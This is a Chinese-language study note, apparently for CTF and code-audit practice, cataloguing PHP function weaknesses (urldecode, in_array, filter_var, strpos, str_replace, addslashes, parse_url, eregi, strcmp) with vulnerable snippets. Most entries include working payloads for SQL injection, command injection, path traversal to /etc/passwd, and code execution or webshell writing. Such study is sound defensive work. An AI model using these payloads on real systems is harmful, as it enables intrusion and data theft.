## **参数处理函数缺陷**
#### **1、urldecode — 解码已编码的 URL 字符串**
```
语法：urldecode( string $str) : string
解码给出的已编码字符串中的任何 %##。 加号（'+'）被解码成一个空格字符。

下面列举了一个关于urldecode()引发SQL注入的例子（具体漏洞编号没找到）
是以前Discuz X1.5的一个漏洞
foreach($_POST as $k => $v) {
$value = urldecode($v);
$this->setParameter($k, $value);
}

单引号被 urlencode 两次以后是 %2527，然后 POST，PHP 内部在生成全局变量 $_POST 的时候会先 urldecode，得到 %27，
然后 PHP 会检查 Magic Quotes 的设置，但是无论是否开启 Magic Quotes，
%27 都不会被转义，因为这时根本没有单引号。但是这时如果在PHP中加上 urldecode，%27就变成单引号了
```

^
#### **2、rawurldecode — 对已编码的 URL 字符串进行解码**
```
语法 rawurldecode( string $str) : string
返回字符串，此字符串中百分号（%）后跟两位十六进制数的序列都将被替换成原义字符。
这个就不细讲了，和urldecode差不多。
```

^
#### **3、is_numeric**
```
bool is_numeric ( mixed $var )
如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。
仅用is_numeric判断而不用intval转换就有可能插入16进制的字符串到数据库，进而可能导致sql二次注入。
```


^
#### **4、in_array()没有true**
用in_array()做白名单，但是第三个参数没有用true。
```
例如文件名为 7shell.php 。
因为PHP在使用 in_array()函数判断时，
会将 7shell.php 强制转换成数字7，而数字7在 range(1,24)数组中，
最终绕过 in_array() 函数判断，导致任意文件上传漏洞。
sql注入等。
```


**in_array()绕过**

在 PHP 手册中， `in_array()` 函数的解释是 `bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )` ,如果strict参数没有提供，那么 `in_array` 就会使用松散比较来判断 `$needle` 是否在 `$haystack` 中。当 strict 的值为 true 时， `in_array()` 会比较 needls 的类型和 haystack 中的类型是否相同。

in_array()在判断时使用的是弱比较，当比较一个字符串和一个数字时默认会尝试把字符串转换为数字，如果字符串的第一个字符不是数字的话则该字符串会被转化成0。

```
$array=[0,1,2,'3'];
var_dump(in_array('abc', $array)); //true
var_dump(in_array('1bc', $array)); //true
```

可以看到上面的情况返回的都是 true，因为 `'abc'` 会转换为 0， `'1bc'` 转换为 1。

`array_search()` 与 `in_array()` 也是一样的问题。



^
#### **5、filter_var过滤url格式**
```
$url = $_GET['url'];
if(isset($url) && filter_var($url, FILTER_VALIDATE_URL)){
    $site_info = parse_url($url);
    if(preg_match('/sec-redclub.com$/',$site_info['host'])){
        exec('curl "'.$site_info['host'].'"', $result);
```
这里用了 **filter_var** 函数来过滤变量，且用了 **FILTER_VALIDATE_URL** 过滤器来判断是否是一个合法的url。并且满足 **$site\_info\['host']** 的值以 **sec-redclub.com** 结尾
payload
```

?url=demo://%22;ls;%23;sec-redclub.com:80/
?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/
```
^
同理
```
从POST中获取请求体参数
$email = filter_input(INPUT_POST, 'email',FILTER_VALIDATE_EMAIL);
filter_input()用于从外部变量（如$_GET、$_POST、$_COOKIE、$_SERVER、$_ENV、$_REQUEST）中获取输入，并应用过滤器对输入进行处理。
可能被模仿邮箱地址绕过sql注入:'union/**/select/**/username/**/from/**/user#@qq.com
123@qq.com' UNION SELECT * FROM admin WHERE 1=1 #
```

^
#### **6、class_exists()任意文件读取**
**class_exists()** 函数就会自动调用本程序中的 **__autoload** 函数，这题的文件包含漏洞就出现在这个地方。攻击者可以使用 **路径穿越** 来包含任意文件，当然使用路径穿越符号的前提是 **PHP5~5.3(包含5.3版本)版本** 之间才可以。例如类名为： **../../../../etc/passwd** 的查找，将查看passwd文件。

^
#### **7、strpos()函数绕过**
strpos()函数返回查找到的子字符串的下标
如果字符串开头就是我们要搜索的目标，则返回下标 0 ；如果搜索不到，则返回 false
```
if(!strpos($pass,'>'))
代码原意是$pass中不能>字符，
但是如果>在第一个位置0，取反!后就为true则绕过if
```
也可以
闭合，拼接，注释
绕过



^
#### **8、str_replace替换做过滤可能的缺陷**
```
这里看似过滤../防止目录穿越
str_replace('../','',$language)；
```
程序仅仅只是将 **../** 字符替换成空，这并不能阻止攻击者进行攻击。例如攻击者使用payload：**....//** 或者 **..././** ，在经过程序的 **str_replace** 函数处理后，都会变成 **../**

类似的正则替换preg_replace配合addslashes时，也可能绕过防御。
```
$str = "\\';echo `cat flag.php`?>";
```
也可以
闭合，拼接，注释
绕过
^
#### **9、变量覆盖逃逸addslashes**
```
if(isset($_POST['msg']) && $_POST['msg'] !==''){
    $msg = addslashes($_POST['msg']);
    $msg = replace_bad_word(convert($msg));
    $sql = "INSERT INTO users VALUES($id,'".$msg."')";
    $result = $conn->query($sql);
    if($conn->error) die($conn->error);
}

function replace_bad_word($str){
    global $limit_words;
    foreach ($limit_words as $old => $new) {
        strlen($old) > 2 && $str = str_replace($old,trim($new),$str);
    }
    return $str;
}

function convert($str){
    return htmlentities($str);
}

$limit_words = array('造反' => '造**', '法hh' => '法**');

foreach (array('_GET','_POST') as $method) {
    foreach ($$method as $key => $value) {
        $$key = $value;
    }
}
```
```
这里，我们便可以通过变量覆盖 **$limit_words** 数组，来逃逸单引号，
因为在 **index.php** 文件中使用了 **addslashes** 函数。

msg=1%00' and updatexml(1,concat(0x7e,(select * from flag),0x7e),1))#&limit_words[\0\]=
```


^
#### **10、程序在过滤后没有退出，程序还能执行**
```
error_log（"Hacking attempt.");
header（'Location:/error/');

assert（"(int)$pi ==3")
```
没有使用die ，exit等函数，assert还能执行，$pi直接代码执行。


^
#### **11、未过滤${的可变代码执行**
```
 $content = '<?php  $mysql_server_name="'.$local.'";   $mysql_database="'.$data.'";    $mysql_username="'.$user.'";  $mysql_password="'.$ps.'";   ?>';  

file_put_contents($file,$content);
```
php语言的特性：[PHP可变变量](http://php.net/manual/zh/language.variables.variable.php) 。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 （[\[红日安全\]代码审计](https://www.freebuf.com/column/182130.html)）
可以发现拼接后的字符串把所有的变量都放到了单引号中，并且在字符串过滤时并没有过滤‘{}’，‘()’和‘$’等非法字符。这样一来漏洞利用方式就很清晰了，通过变量注入可执行代码，再去访问注入代码的php文件即可。

```
?ps=${phpinfo()}
```


^
#### **12、htmlentities()拿来过滤sql**

**htmlentities()** 并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制（通过第二个参数）。第2个参数取值有3种，分别如下：
* ENT_COMPAT（默认值）：只转换双引号。
* ENT_QUOTES：两种引号都转换。
* ENT_NOQUOTES：两种引号都不转换

如果只是ENT_COMPAT的话，只转义“，可以用单引号进行sql注入。

如果是ENT_QUOTES，”和'都会转义，此时可以直接传入转义符\，重写闭合进行sql注入。



^
#### **13、addslashes()处理过滤**
作用：在单引号（'）、双引号（"）、反斜线（\）与 NUL（ NULL 字符）字符之前加上反斜线。
```
常常配合substr截断，当转义\'后，正好截断到\，此时\可以转义sql的拼接。
```


^
## **函数突破**

#### **get_object_vars函数**
```
file_put_contents(
    self::EXTERNAL_DIRECTORY . $this->id,
    var_export(get_object_vars($this)，true)
);
```
get_object_vars($this)是获取本类的属性和属性值，做为数组返回。
又写入文件，可以通过闭合，写入shell。
```
?name=',)%0a<?php phpinfo();?>//
```


^
#### **eregi函数**
老php的正则匹配
```
$check=eregi('select|insert|update|delete|\*/\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile'，$str);
if($check) exit();
```
使用00截断即可绕过
```
-1/*%00*/union/**/select/**/1,flag,3,4/**/from/**/flag
```


^
#### **strcmp()**

`strcmp()` 函数在 PHP 官方手册中的描述是 `intstrcmp ( string $str1 ， string $str2 )`，需要给 `strcmp()` 传递 2 个 `string` 类型的参数。如果 `str1` 小于 `str2`，返回 -1，相等返回 0，否则返回 1。`strcmp()` 函数比较字符串的本质是将两个变量转换为 ASCII，然后进行减法运算，然后根据运算结果来决定返回值。

如果传入给出 `strcmp()` 的参数是数字呢？

```php
$array=[1,2,3];
var_dump(strcmp($array,'123')); //null,在某种意义上null也就是相当于false。
```
如：?cat[1][]=1&dog=%00&cat[0]="isccctf2017"
%00用于截断eregi函数
```
$c=@$_GET['cat'];
$d=@$_GET['dog'];
if(@$c[1]){
    if(!strcmp($c[1],$d) && $c[1]!==$d){
        echo $c[0];
        eregi("3|1|c",$d.$c[0])?die("nope"):NULL; 
        strpos(($c[0].$d), "isccctf2017")?$v3=1:NULL;
    }
}
```

^
#### **parse_url**
parse_url函数存在一个bug:
当url的格式为`http:/localhost///x.php?key=value`的方式可以使其返回`False`
///再域名端口后面第一个。如：baidu.com///aa/b.php?a=2
这样就可以成功绕过之后的三次preg_match的过滤.
```
$url = urldecode($_SERVER['REQUEST_URI']);
$url = parse_url($url, PHP_URL_QUERY); //或?后内容
if (preg_match("/_/i", $url)) 
{
    die("...");
}
if (preg_match("/0/i", $url)) 
{
    die("...");
}
if (preg_match("/w+/i", $url)) 
{
    die("...");
}
```
```
http://35.185.178.212///?_=0.0
///?_=a
///?_=0a
```